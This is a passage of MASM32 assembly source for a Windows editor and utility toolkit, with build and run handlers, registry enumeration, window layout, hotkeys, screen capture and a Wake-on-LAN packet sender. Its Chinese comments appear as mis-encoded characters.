; ���е��Ƿ�Ϊ����̨��������ǽ����ʾ��hWinEdit1��
;-----------------------------------
_RunProgram   proc _dwConsole

              .if _dwConsole   ;�ǿ���̨����
		   invoke	GetStartupInfo,addr stStartUp
	  	   invoke	CreateProcess,NULL,addr szBuffer,NULL,NULL,\
			NULL,NORMAL_PRIORITY_CLASS,NULL,NULL,offset stStartUp,offset stProcInfo
		   .if	eax !=	0
			invoke	WaitForSingleObject,stProcInfo.hProcess,INFINITE
			invoke	CloseHandle,stProcInfo.hProcess
			invoke	CloseHandle,stProcInfo.hThread
		   .else
			invoke	MessageBox,hWinMain,addr szExcuteError,NULL,MB_OK or MB_ICONERROR
		   .endif
              .else
                   invoke  _preLoad1
   		   invoke  CreateProcess,NULL,addr szBuffer,NULL,NULL,\
			TRUE,NULL,NULL,NULL,offset stStartUp,offset stProcInfo
		   .if	eax !=	0
			invoke	WaitForSingleObject,stProcInfo.hProcess,INFINITE
			invoke	CloseHandle,stProcInfo.hProcess
			invoke	CloseHandle,stProcInfo.hThread
                        invoke  CloseHandle,hFileConsole
		   .else
			invoke	MessageBox,hWinMain,addr szExcuteError,NULL,MB_OK or MB_ICONERROR
		   .endif
                   invoke  _getFromFile1
              .endif

              ret
_RunProgram   endp

;-----------------------------------
; ���Գ���
;-----------------------------------
_debugProgram   proc uses ebx ecx edx esi edi _lParam

               ;���ļ�·��������������չ��������������ط�
               mov esi,offset szFileNameOpen
               mov edi,offset szFileNameOpenBack2
               .repeat
                  mov al,byte ptr [esi]
                  .if al==2Eh
                     .break
                  .endif
                  mov byte ptr [edi],al
                  inc esi
                  inc edi
               .until FALSE 
               mov byte ptr [edi],2Eh   ;.
               mov byte ptr [edi+1],65h ;e
               mov byte ptr [edi+2],78h ;x
               mov byte ptr [edi+3],65h ;e
               mov byte ptr [edi+4],0
               invoke wsprintf,addr szBuffer,addr szRun,\
                         addr szFileNameOpenBack2

               invoke GetStartupInfo,addr stStartUp
               invoke CreateProcess,NULL,addr szBuffer,NULL,NULL,\
                      NULL,NORMAL_PRIORITY_CLASS,NULL,NULL,offset stStartUp,offset stProcInfo
               .if eax!=0
                   invoke WaitForSingleObject,stProcInfo.hProcess,INFINITE
                   invoke CloseHandle,stProcInfo.hProcess
                   invoke CloseHandle,stProcInfo.hThread
               .else
                   invoke MessageBox,hWinMain,addr szExcuteError,NULL,MB_OK or MB_ICONERROR
               .endif
               invoke UpdateWindow,hWinMain
               ret
_debugProgram   endp

;--------------------------
; �˵���ѡ�к���ʾ�Ի���
;--------------------------
_DisplayMenuItem  proc  _dwCommandID
       local @szBuffer[256]:byte
       pushad
       invoke wsprintf,addr @szBuffer,addr szFormat,_dwCommandID
       invoke MessageBox,hWinMain,addr @szBuffer,\
              offset szCaption,MB_OK
       popad
       ret
_DisplayMenuItem endp

;------------
; �˳�ϵͳ
;------------
_Quit  proc
       pushad
       invoke _CheckModify
       .if eax
          invoke DestroyWindow,hWinMain
          invoke PostQuitMessage,NULL
          .if hFile
             invoke CloseHandle,hFile
          .endif
       .endif
       popad
       ret
_Quit  endp


;---------------------------------------------
; ö��ĳ���µ��Ӽ����������ֵ
;---------------------------------------------
_EnumKey	proc	_lpKey
      local @hKey,@dwIndex
      local @szBuffer1[512]:byte
      local @szBuffer[256]:byte
      local @szValue[256]:byte
      local @dwSize,@dwSize1,@dwType

      ;ö���Ӽ�
      mov @dwIndex,0
      invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,_lpKey,NULL,\
             KEY_ENUMERATE_SUB_KEYS,addr @hKey
      .if eax==ERROR_SUCCESS
         .while TRUE
            mov @dwSize,sizeof @szBuffer
            invoke RegEnumKeyEx,@hKey,@dwIndex,addr @szBuffer,\
                   addr @dwSize,NULL,NULL,NULL,NULL
            .break .if eax==ERROR_NO_MORE_ITEMS
            
            inc @dwIndex
            invoke wsprintf,addr @szBuffer1,addr szFmtSubKey,\
                   addr @szBuffer
            invoke MessageBox,hWinMain,addr @szBuffer1,\
                   offset szCaption,MB_OK
         .endw
         invoke RegCloseKey,@hKey
      .endif
      ;ö�ټ�
      mov @dwIndex,0
      invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,_lpKey,NULL,\
             KEY_QUERY_VALUE,addr @hKey
      .if eax==ERROR_SUCCESS
        .while TRUE
           mov @dwSize,sizeof @szBuffer
           mov @dwSize1,sizeof @szValue
           invoke RegEnumValue,@hKey,@dwIndex,addr @szBuffer,\
                  addr @dwSize,NULL,addr @dwType,addr @szValue,\
                  addr @dwSize1
           .break .if eax==ERROR_NO_MORE_ITEMS

           mov eax,@dwType
           .if eax==REG_SZ
             invoke wsprintf,addr @szBuffer1,addr szFmtSz,addr @szBuffer,\
                    addr @szValue
           .elseif eax==REG_DWORD
             invoke wsprintf,addr @szBuffer1,addr szFmtDword,addr @szBuffer,\
                    dword ptr @szValue
           .else
             invoke wsprintf,addr @szBuffer1,addr szFmtValue,addr @szBuffer
           .endif
           inc @dwIndex

           invoke MessageBox,hWinMain,addr @szBuffer1,\
                   offset szCaption,MB_OK

        .endw
        invoke RegCloseKey,@hKey
      .endif
      ret

_EnumKey	endp

_calcDec proc uses ebx edi _dwTwice:DWORD,_dwValue:DWORD
         local @dwTen:DWORD
         local @dwReturn:DWORD

         mov @dwTen,10

         fild _dwValue
         mov esi,_dwTwice
         .while esi>0
           fild @dwTen
           fmul
           dec esi
         .endw
         fistp @dwReturn
         mov eax,@dwReturn
         ret
_calcDec endp
_str2int proc uses ebx esi _lpszText:DWORD
       local @sTmp:DWORD

       invoke lstrlen,_lpszText
       .if eax==0
         ret
       .endif
       push eax
       pop ecx
       dec ecx

       xor eax,eax
       xor ebx,ebx
       xor edi,edi
       mov esi,_lpszText
       mov al,byte ptr [esi]
       .while al>0
          sub al,30h

          push esi
          push ecx
          push edi
          invoke _calcDec,ecx,eax
          mov @sTmp,eax
          pop edi
          pop ecx
          pop esi
        
          add edi,@sTmp
          dec ecx
          inc esi
          xor eax,eax
          mov al,byte ptr [esi]
       .endw
       mov eax,edi      
       ret
_str2int endp
;------------------------------------
; ��ȡ����˴���������
;------------------------------------
_getCurrentLine proc
        local @szTmpBuffer[512]:byte
        local @stRange:CHARRANGE

        invoke RtlZeroMemory,addr @szTmpBuffer,sizeof @szTmpBuffer

        ;�õ���
        invoke SendMessage,hWinEdit1,EM_EXGETSEL,0,addr @stRange
        mov eax,@stRange.cpMin
        invoke SendMessage,hWinEdit1,EM_EXLINEFROMCHAR,0,eax

        ;invoke wsprintf,addr @szTmpBuffer,addr szOut,eax
        ;invoke MessageBox,hWinEdit1,addr @szTmpBuffer,NULL,MB_OK

        push eax
        invoke SendMessage,hWinEdit1,EM_LINEINDEX,eax,0
        mov @stRange.cpMin,eax
        pop eax
        inc eax
        invoke SendMessage,hWinEdit1,EM_LINEINDEX,eax,0
        mov @stRange.cpMax,eax
        ;�õ�ѡ�е�����
        invoke SendMessage,hWinEdit1,EM_EXSETSEL,0,addr @stRange
        invoke SendMessage,hWinEdit1,EM_GETSELTEXT,0,addr szBuffer

        ;��ȡ���к�
        mov esi,offset szBuffer
        mov edi,offset szPlaceLine

        .repeat
           xor eax,eax
           mov al,byte ptr [esi]
           inc esi
           .break .if eax==28h
           .break .if eax==00h
        .until FALSE

        .if al>0
          .repeat
             xor eax,eax
             mov al,byte ptr [esi]
             .break .if eax==29h
             .break .if eax==00h
             mov byte ptr [edi],al
             inc esi
             inc edi
          .until FALSE
        .endif
        invoke _str2int,addr szPlaceLine
        dec eax  ;�кŴ�0��ʼ

        ;��ת��ָ���к�λ��
        push eax
        invoke SendMessage,hWinEdit,EM_LINEINDEX,eax,0
        mov @stRange.cpMin,eax
        pop eax
        inc eax
        invoke SendMessage,hWinEdit,EM_LINEINDEX,eax,0
        mov @stRange.cpMax,eax
        invoke SendMessage,hWinEdit,EM_EXSETSEL,0,addr @stRange
        ;Ҫ�ﵽ����Ч���������ı���ʱ����ʹ��ES_NOHIDESEL
        invoke SendMessage,hWinEdit,EM_SCROLLCARET,0,0
        invoke SendMessage,hWinEdit,EM_LINESCROLL,0,-1
        ;�ָ�����������Ϊ��        
        invoke RtlZeroMemory,addr szBuffer,512
        invoke RtlZeroMemory,addr szPlaceLine,512
        ret
_getCurrentLine endp
;---------------------------------------
; �����ı����С��ʹ���ƶ����������¶�
;---------------------------------------
_Resize proc
        local @stRect:RECT,@stRect1:RECT,@stStatus:RECT
        local @stPToolbarRect:RECT

        invoke MoveWindow,hWinStatus,0,0,0,0,TRUE         
        ;invoke SendMessage,hWinToolbar,TB_AUTOSIZE,0,0
        invoke GetClientRect,hWinMain,addr @stRect
        invoke GetWindowRect,hWinToolbar,addr @stRect1
        invoke GetWindowRect,hWinPToolbar,addr @stPToolbarRect
        invoke GetWindowRect,hWinStatus,addr @stStatus

        ;ESI��Ž��̹������߶�
        mov esi,@stPToolbarRect.bottom
        sub esi,@stPToolbarRect.top

        
        
        ;EAX��ų��ù������߶�
        mov eax,@stRect1.bottom
        sub eax,@stRect1.top

        ;ECX����ı�����߶�
        mov ecx,@stRect.bottom
        sub ecx,eax
        sub ecx,esi
        mov edx,@stStatus.bottom
        sub edx,@stStatus.top
        sub ecx,edx

        push eax
        push ecx
        push esi
        push eax
        invoke MoveWindow,hWinToolbar,0,0,@stRect.right,eax,TRUE
        pop eax
        invoke MoveWindow,hWinPToolbar,0,eax,@stRect.right,esi,TRUE
        pop esi
        pop ecx
        sub ecx,60   ;����50�ĸ߶ȸ������
        pop eax
        add eax,esi
        push eax
        push ecx
        invoke MoveWindow,hWinEdit,0,eax,@stRect.right,ecx,TRUE
        pop ecx
        pop eax
        mov edi,eax
        add edi,ecx  
        add edi,5 
        invoke MoveWindow,hWinEdit1,0,edi,@stRect.right,55,TRUE
        ret
_Resize endp

_playWavFile  proc
    
    invoke FindFirstFile,addr lpFindFile,addr lpFindFileData
    .if eax!=INVALID_HANDLE_VALUE
        mov hFindFile,eax
        .repeat
           invoke FindNextFile,hFindFile,addr lpFindFileData
        .until eax==FALSE
        invoke FindClose,hFindFile
        mov esi,offset lpFindFileData
        assume esi:ptr WIN32_FIND_DATA
        invoke RtlZeroMemory,addr szWavSaveFile,sizeof szWavSaveFile
        invoke wsprintf,addr szWavSaveFile,addr szFormatWaveFile1,\
               addr szWavPath,addr [esi].cFileName
        invoke PlaySound,addr szWavSaveFile,NULL,SND_FILENAME
               assume esi:nothing
    .endif
    ret
_playWavFile  endp

;------------------
; ������Ϣ�����ӳ���
;------------------
_ProcWinMain proc uses ebx edi esi,hWnd,uMsg,wParam,lParam
      local @stPos:POINT
      local @hSysMenu
      local @stST:SYSTEMTIME
      local @stST1:SYSTEMTIME
      local @szBuffer[128]:byte
      local @szRange:CHARRANGE
      local @stPs:PAINTSTRUCT
      local cfm:CHARFORMAT
      local @dwLeft:DWORD
      local @dwTop:DWORD
      local @stRect1:RECT
      local @stRect2:RECT

      local @hBitmap
      local @hdc,@hdcCompatible
      local @bm:BITMAP    
      local @tmp1,@tmp2,@tmp3              
       
      local @dwThreadID
      local @szValue[256]:byte
      local @dwSize,@dwType,@hKey
      local @lpBuffer,@hDib,@hFile,@dwBytesRead

      mov eax,uMsg
      
      .if eax==WM_CREATE  ;���ڴ�����Ϣ����ϵͳ����Ӳ˵���
          mov eax,hWnd
          mov hWinMain,eax

          invoke GetSubMenu,hMenu,1
          mov hSubMenu,eax
          ;��ϵͳ�˵�����Ӳ˵���
          invoke GetSystemMenu,hWnd,FALSE
          mov @hSysMenu,eax
          invoke AppendMenu,@hSysMenu,MF_SEPARATOR,0,NULL
          invoke AppendMenu,@hSysMenu,\
                 0,IDM_HELP,offset szMenuHelp
          invoke AppendMenu,@hSysMenu,\
                 0,IDM_ABOUT,offset szMenuAbout

          ;�����ı���ͻ���
          invoke CreateWindowEx,WS_EX_ACCEPTFILES or WS_EX_CLIENTEDGE,addr szClassEdit,\
                 NULL,WS_CHILD or WS_VISIBLE or ES_MULTILINE\
                 or ES_WANTRETURN or WS_VSCROLL or WS_HSCROLL or\
                 ES_NOHIDESEL or ES_AUTOVSCROLL or ES_AUTOHSCROLL,0,0,0,0,\
                 hWnd,ID_EDIT,hInstance,NULL
          mov hWinEdit,eax
          invoke SendMessage,hWinEdit,EM_SETEVENTMASK,0,ENM_CHANGE or\
                 ENM_SELCHANGE or ENM_KEYEVENTS or ENM_MOUSEEVENTS or\
                 ENM_DROPFILES
          invoke SendMessage,hWinEdit,EM_EXLIMITTEXT,0,-1

          ;�����ı����ն������
          invoke CreateWindowEx,WS_EX_CLIENTEDGE,addr szClassEdit,\
                 NULL,WS_CHILD or WS_VISIBLE or ES_MULTILINE\
                 or ES_WANTRETURN or WS_VSCROLL or\
                 ES_NOHIDESEL or ES_READONLY or ES_AUTOVSCROLL or ES_AUTOHSCROLL,
                 0,0,0,0,hWnd,ID_EDIT1,hInstance,NULL
          mov hWinEdit1,eax
          invoke SendMessage,hWinEdit1,EM_SETEVENTMASK,0,ENM_CHANGE or\
               ENM_SELCHANGE or ENM_MOUSEEVENTS
          invoke SendMessage,hWinEdit1,EM_EXLIMITTEXT,0,-1
          ;�����ı�ǰ��ɫΪ�ڣ�����ɫΪ��
          invoke SendMessage,hWinEdit1,EM_SETBKGNDCOLOR,0,0ffffffh
          invoke RtlZeroMemory,addr cfm,sizeof cfm
          mov cfm.cbSize,sizeof cfm
          mov cfm.dwMask,CFM_COLOR
          mov cfm.crTextColor,0
          invoke SendMessage,hWinEdit1,EM_SETCHARFORMAT,SCF_ALL,addr cfm

          ;ע�ᡰ���ҡ��Ի��򣬳�ʼ����ؽṹ
          mov  stFind.lStructSize,sizeof stFind
          push hWnd
          pop stFind.hwndOwner
          mov stFind.Flags,FR_DOWN
          mov stFind.lpstrFindWhat,offset szFindText
          mov stFind.wFindWhatLen,sizeof szFindText
          mov stFind.lpstrReplaceWith,offset szReplaceText
          mov stFind.wReplaceWithLen,sizeof szReplaceText
          invoke RegisterWindowMessage,addr FINDMSGSTRING
          mov idFindMessage,eax


          ;����������
          invoke CreateToolbarEx,hWnd,WS_VISIBLE or\
                 WS_CHILD or TBSTYLE_FLAT or TBSTYLE_TOOLTIPS or\
                 CCS_ADJUSTABLE,ID_TOOLBAR,20,hInstance,\
                 IDB_TOOLBAR1,offset stToolbar,\
                 NUM_BUTTONS,0,0,16,16,sizeof TBBUTTON
          mov hWinToolbar,eax

          ;�������̹�������
          ;�����ָ��CCS_NORESIZE�Ϳ��Կ��ƹ�������λ
          invoke CreateToolbarEx,hWnd,WS_VISIBLE or\
                 WS_CHILD or TBSTYLE_FLAT or TBSTYLE_TOOLTIPS or\
                 CCS_ADJUSTABLE or CCS_NORESIZE,ID_PTOOLBAR,9,hInstance,\
                 IDB_TOOLBAR2,offset stProcessToolbar,\
                 PROCESSNUM_BUTTONS,0,0,16,16,sizeof TBBUTTON
          mov hWinPToolbar,eax
          ;����״̬��
          invoke CreateStatusWindow,WS_CHILD or WS_VISIBLE or\
                 SBS_SIZEGRIP,NULL,hWinMain,ID_STATUSBAR
          mov hWinStatus,eax
          invoke SendMessage,hWinStatus,SB_SETPARTS,5,offset dwStatusWidth
          invoke _SetStatus
          invoke _SetFont,addr szFontFace,10*20,0
          invoke SetTimer,hWnd,1,300,NULL

          ;���������
          invoke GetSystemMetrics,SM_CXMAXIMIZED
          mov dwScrWidth,eax
          invoke GetSystemMetrics,SM_CYMAXIMIZED
          mov dwScrHeight,eax
          invoke MoveWindow,hWnd,0,0,dwScrWidth,dwScrHeight,TRUE         

          call _Resize
      .elseif eax==WM_TIMER
          invoke GetLocalTime,addr @stST
          movzx eax,@stST.wHour
          movzx ebx,@stST.wMinute
          movzx ecx,@stST.wSecond
          invoke wsprintf,addr @szBuffer,addr szFormat0,\
                eax,ebx,ecx
          invoke SendMessage,hWinStatus,SB_SETTEXT,\
                0,addr @szBuffer

          invoke  IsClipboardFormatAvailable,CF_TEXT
	  .if eax
		invoke	EnableMenuItem,hMenu,IDM_PASTE,MF_ENABLED
		invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_PASTE,TRUE
	  .else
		invoke	EnableMenuItem,hMenu,IDM_PASTE,MF_GRAYED
		invoke	SendMessage,hWinToolbar,TB_ENABLEBUTTON,IDM_PASTE,FALSE
	  .endif
      .elseif eax==WM_SIZE
          call _Resize
      .elseif eax==WM_HOTKEY  ;ȫ�ֿ�ݼ�
          mov eax,wParam
          movzx eax,ax
          .if eax==HOT_CTRL_ALT_ENTER   ;ע����ȼ�ʹ����ǰ������Ҫѡ��һ��Ҫ���صĳ���
              .if dwWinIsHidden
                invoke FindWindow,addr szClassNameBuf,addr szWndTextBuf
                invoke ShowWindow,eax,SW_SHOW
                mov dwWinIsHidden,0
              .else
                invoke FindWindow,addr szClassNameBuf,addr szWndTextBuf
                invoke ShowWindow,eax,SW_HIDE
                mov dwWinIsHidden,1
              .endif
          .endif
          .if eax==HOT_CTRL_ALT_H   ;���Ƶ�ǰ���ڵ���ʾ������
              .if dwThisIsHidden
                invoke ShowWindow,hWinMain,SW_SHOW
                mov dwThisIsHidden,0
              .else
                invoke ShowWindow,hWinMain,SW_HIDE
                mov dwThisIsHidden,1
              .endif
          .endif
          .if eax==HOT_CTRL_ALT_ADD   ;���Ƶ�ǰ���ڵ�͸����
              dec dwInitTransparent
              .if dwInitTransparent<0
                  mov dwInitTransparent,0
              .endif
              invoke _setTransparency,hWinMain,dwInitTransparent
          .endif
          .if eax==HOT_CTRL_ALT_SUB   ;���Ƶ�ǰ���ڵ�͸����
              inc dwInitTransparent
              .if dwInitTransparent>255
                  mov dwInitTransparent,255
              .endif
              invoke _setTransparency,hWinMain,dwInitTransparent
          .endif
      .elseif eax==WM_COMMAND  ;����˵������ټ���Ϣ
          ;invoke _DisplayMenuItem,wParam
          
          mov eax,wParam
          movzx eax,ax
          .if eax==IDM_EXIT
            call _Quit
          .elseif eax==IDM_OPEN    ;���ļ�
            invoke _CheckModify
            .if eax
                call _OpenFile
                mov fIsNewDoc,0
            .endif
          .elseif eax==IDM_SAVE    ;�����ļ�
            call _SaveFile
            mov fIsNewDoc,0
          .elseif eax==IDM_SAVEAS  ;����ļ�
            call _SaveAs
            mov fIsNewDoc,0
          .elseif eax==IDM_NEW     ;�½��ļ�
            invoke _CheckModify
            .if eax
                .if hFile
                    invoke CloseHandle,hFile
                    mov hFile,0
                .endif
                mov szFileNameOpen,0
                invoke SetWindowText,hWinEdit,NULL
                invoke _SetCaption
                invoke _SetStatus
            .endif
            mov fIsNewDoc,1
          .elseif eax==ID_EDIT     ;������ı�����ʾ�ֽ���
               invoke GetWindowTextLength,hWinEdit
               invoke wsprintf,addr @szBuffer,\
                      addr szFormat1,eax
               invoke SendMessage,hWinStatus,SB_SETTEXT,\
                      1,addr @szBuffer
          .elseif eax==IDM_UNDO  ;����
               invoke SendMessage,hWinEdit,EM_UNDO,0,0
          .elseif eax==IDM_REDO  ;����
               invoke SendMessage,hWinEdit,EM_REDO,0,0
          .elseif eax==IDM_SELALL ;ȫѡ
               mov @szRange.cpMin,0
               mov @szRange.cpMax,-1
               invoke SendMessage,hWinEdit,EM_EXSETSEL,0,addr @szRange
          .elseif eax==IDM_COPY   ;����
               invoke SendMessage,hWinEdit,WM_COPY,0,0
          .elseif eax==IDM_CUT   ;����
               invoke SendMessage,hWinEdit,WM_CUT,0,0
          .elseif eax==IDM_PASTE   ;ճ��
               invoke SendMessage,hWinEdit,WM_PASTE,0,0
          .elseif eax==IDM_FIND   ;����
               mov fFindReplace,0
               invoke SendMessage,hWinEdit,EM_GETSELTEXT,0,stFind.lpstrFindWhat
               invoke FindText,addr stFind
               .if eax
                   mov hFindDialog,eax
               .endif
          .elseif eax==IDM_FINDPREV  ;����ǰһ��
               and stFind.Flags,not FR_DOWN
               invoke _FindText
          .elseif eax==IDM_FINDNEXT  ;���Һ�һ��
               or stFind.Flags,FR_DOWN
               invoke _FindText
          .elseif eax==IDM_REPLACE   ;�滻
               mov fFindReplace,1
               invoke SendMessage,hWinEdit,EM_GETSELTEXT,0,stFind.lpstrFindWhat
               invoke ReplaceText,addr stFind
               .if eax
                   mov hReplaceDialog,eax
               .endif
          .elseif eax==IDM_GO         ;ת��
               invoke DialogBoxParam,hInstance,GOTODLG,hWnd,\
                        offset _GoToMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_SETFONT      ;��������
               invoke _ChooseFont
          .elseif eax==IDM_SETCOLOR     ;���ñ���ɫ
               invoke _ChooseColor     
          .elseif eax==IDM_PAGESETUP    ;ҳ������
               invoke _PageSetup
          .elseif eax==IDM_TRANSPARENT  ;����͸����
               invoke DialogBoxParam,hInstance,VIEWDLG_TRANSPARENT,hWnd,\
                        offset _DlgTransparentProc,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_RES          ;������Դ�ļ�
               ;���ļ�·��������������չ��������������ط�
               mov esi,offset szFileNameOpen
               mov edi,offset szFileNameOpenBack2
               mov byte ptr [edi],22h
               inc edi

               .repeat
                  mov al,byte ptr [esi]
                  .if al==2Eh
                     .break
                  .endif
                  mov byte ptr [edi],al
                  inc esi
                  inc edi
               .until FALSE 
               mov byte ptr [edi],2Eh   ;.
               mov byte ptr [edi+1],72h ;r
               mov byte ptr [edi+2],63h ;c
               mov byte ptr [edi+3],22h ;"
               mov byte ptr [edi+4],0
               invoke wsprintf,addr szBuffer,addr szRes,\
                         addr szFileNameOpenBack2
               invoke _RunProgram,FALSE
          .elseif eax==IDM_COMPILE      ;����
               ;Ϊ����������ʶ���ո��Ŀ¼��������е���
               ;���ļ���ǰ�����""
               mov esi,offset szFileNameOpen
               mov edi,offset szFileNameOpen1
               mov byte ptr [edi],22h
               inc edi
               .repeat
                  mov al,byte ptr [esi]
                  .break .if al==0h
                  mov byte ptr [edi],al
                  inc esi
                  inc edi
               .until FALSE 
               inc edi
               mov byte ptr [edi],22h             

               invoke wsprintf,addr szBuffer,addr szCompile,addr szFileNameOpen1
               invoke _RunProgram,FALSE
          .elseif eax==IDM_LINK         ;����
               ;���ļ�·��������������չ��������������ط�
               mov ebx,offset szFileNameOpenBack1
               mov esi,offset szFileNameOpen
               mov edi,offset szFileNameOpenBack
               mov byte ptr [edi],22h
               inc edi
               mov byte ptr [ebx],22h
               inc ebx

               .repeat
                  mov al,byte ptr [esi]
                  .if al==2Eh
                     .break
                  .endif
                  mov byte ptr [edi],al
                  mov byte ptr [ebx],al
                  inc esi
                  inc edi
                  inc ebx
               .until FALSE 
               push edi
               pop  dwTrackPoint1
               push ebx
               pop  dwTrackPoint2
               mov byte ptr [edi],2Eh   ;.
               mov byte ptr [edi+1],6Fh ;o
               mov byte ptr [edi+2],62h ;b
               mov byte ptr [edi+3],6Ah ;j
               mov byte ptr [edi+4],22h ;"
               mov byte ptr [edi+5],0
               mov byte ptr [ebx],2Eh   ;.
               mov byte ptr [ebx+1],72h ;r
               mov byte ptr [ebx+2],65h ;e
               mov byte ptr [ebx+3],73h ;s
               mov byte ptr [ebx+4],22h ;"
               mov byte ptr [ebx+5],0
               invoke wsprintf,addr szBuffer,addr szLink,\
                         addr szFileNameOpenBack,addr szFileNameOpenBack1
               invoke _RunProgram,FALSE
          .elseif eax==IDM_RUN          ;����
               invoke CreateThread,NULL,0,offset _debugProgram,\
                      NULL,NULL,addr @dwThreadID
               invoke CloseHandle,eax
          .elseif eax==IDM_TERMINATE    ;�򿪽��̹���Ĵ���
               invoke DialogBoxParam,hInstance,PROCESSDLG_KILL,\
                     hWnd,offset _ProcKillMain,NULL
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_EXECUTE  ;���г���
               invoke DialogBoxParam,hInstance,DLGExec_MAIN,hWnd,offset DialogMainProc,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_TOPWINDOW  ;ϵͳ��������
               invoke DialogBoxParam,hInstance,PROCESSDLG_TOPWIN,hWnd,\
                        offset _ProcTopWinMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_MODULE  ;ģ������̹�������
               invoke DialogBoxParam,hInstance,PROCESSDLG_MODULE,hWnd,\
                        offset _ProcModuleMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_IPPORT  ;������˿ڹ���
               invoke DialogBoxParam,hInstance,PROCESSDLG_IPPORT,hWnd,\
                        offset _ProcIPPortMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_CHATSERVER  ;�Ự������
               invoke DialogBoxParam,hInstance,NET_CHATSERVER,hWnd,\
                        offset _ProcChatServerMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_CHATCLIENT  ;�Ự�ͻ���
               invoke DialogBoxParam,hInstance,NET_CHATCLIENT,hWnd,\
                        offset _ProcChatClientMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_FTPSERVER   ;FTP������
               ;��׽��Ļ
               invoke _captureCustomerScreen,0,0,1024,768
               mov @hBitmap,eax
               invoke _writeBitmapToFile,@hBitmap,addr lpszBmpFile

               invoke GetObject,@hBitmap,sizeof BITMAP,addr @bm
               invoke GetDC,hWnd
               mov @hdc,eax
               invoke CreateCompatibleDC,eax
               mov @hdcCompatible,eax
               invoke SelectObject,@hdcCompatible,@hBitmap
               invoke ReleaseDC,hWnd,eax
               invoke BitBlt,@hdc,0,0,@bm.bmWidth,@bm.bmHeight,@hdcCompatible,0,0,SRCCOPY
               invoke ReleaseDC,hWnd,@hdc
          .elseif eax==IDM_FTPCLIENT
               
               ;���뻺����
               ;invoke GlobalAlloc,GHND,60054
               ;mov @hDib,eax
               ;invoke GlobalLock,@hDib
               ;mov @lpBuffer,eax   

               ;��c:\4.bmp,�������ݶ��뻺����
               ;invoke CreateFile,addr lpsz4BmpFileName,GENERIC_READ,\
               ;       FILE_SHARE_READ,0,OPEN_EXISTING,\
               ;       FILE_ATTRIBUTE_NORMAL,0
               ;mov @hFile,eax
               ;invoke ReadFile,@hFile,@lpBuffer,60054,addr @dwBytesRead,NULL        
               ;����λͼ����
               ;invoke _createDIBitmap,NULL,@lpBuffer
               ;ѹ��������
               ;invoke _zipBitmapToFile,eax,addr lpszQLPicFile
               ;invoke _fromQLPicToBitmap,addr lpszQLPicFile,addr lpsz4BmpFileName

               ;����Զ�̻������ݱ�
               ;���ݱ��ĸ�ʽΪ��UDP�㲥�����˿ڲ��ޣ�������6����FF��+16��MAC��ַ

               ;�������ݰ�
               mov al,0FFh
               mov byte ptr magicPkt[0],al
               mov byte ptr magicPkt[1],al
               mov byte ptr magicPkt[2],al
               mov byte ptr magicPkt[3],al
               mov byte ptr magicPkt[4],al
               mov byte ptr magicPkt[5],al
               mov @tmp1,0
               mov ebx,6
               mov esi,offset magicPkt
               .while TRUE
                  .break .if @tmp1==16
               
                  ;C049ѧ������MAC��ַ
                  mov al,000h
                  mov byte ptr [esi+ebx],al
                  inc ebx
                  mov al,009h
                  mov byte ptr [esi+ebx],al
                  inc ebx
                  mov al,073h
                  mov byte ptr [esi+ebx],al
                  inc ebx
                  mov al,0a4h
                  mov byte ptr [esi+ebx],al
                  inc ebx
                  mov al,006h
                  mov byte ptr [esi+ebx],al
                  inc ebx
                  mov al,06ch
                  mov byte ptr [esi+ebx],al
                  inc ebx

                  inc @tmp1
               .endw
               ;invoke _MemToFile,addr magicPkt,sizeof magic_pkt ͨ�����c:\1���ݣ�����û���κ�����

               invoke _sendMagicPacket  ;�������ݰ�

          .elseif eax==IDM_PORTSCAN  ;�˿�ɨ��
               invoke DialogBoxParam,hInstance,NET_PORTSCAN,hWnd,\
                        offset _ProcPortScanMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_TELNETSERVER  ;TELNET������Ź���
               invoke DialogBoxParam,hInstance,NET_TELNETSERVER,hWnd,\
                        offset _ProcTelnetMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_HTTPFILTER  ;IP���ݰ���׽
               invoke DialogBoxParam,hInstance,NET_IPFILTER,hWnd,\
                        offset _ProcFilterMain,0
               invoke InvalidateRect,hWnd,NULL,TRUE
               invoke UpdateWindow,hWnd
          .elseif eax==IDM_REGISTRY  ;ϵͳ����ʵ�ó���
               ;����ѡ�
               mov pspStartup.dwSize,sizeof PROPSHEETPAGE
               mov pspStartup.dwFlags,PSP_USETITLE
               mov pspStartup.pfnDlgProc,offset _RegStartupDlgProc
               mov pspStartup.pszTemplate,REGDLG_STARTUP
               push hInstance
               pop pspStartup.hInstance
               mov pspStartup.pszTitle,offset lpszSheetStartup
               invoke CreatePropertySheetPage,addr pspStartup
               mov SelectCard,eax  ;����������ҳ�������������
               
               mov pspIE.dwSize,sizeof PROPSHEETPAGE
               mov pspIE.dwFlags,PSP_USETITLE
               mov pspIE.pfnDlgProc,offset _RegIEDlgProc
               mov pspIE.pszTemplate,REGDLG_IE
               push hInstance
               pop pspIE.hInstance
               mov pspIE.pszTitle,offset lpszSheetIE
               invoke CreatePropertySheetPage,addr pspIE
               mov SelectCard+4,eax  ;����������ҳ�������������

               mov pspService.dwSize,sizeof PROPSHEETPAGE
               mov pspService.dwFlags,PSP_USETITLE
               mov pspService.pfnDlgProc,offset _RegServiceDlgProc
               mov pspService.pszTemplate,REGDLG_SERVICE
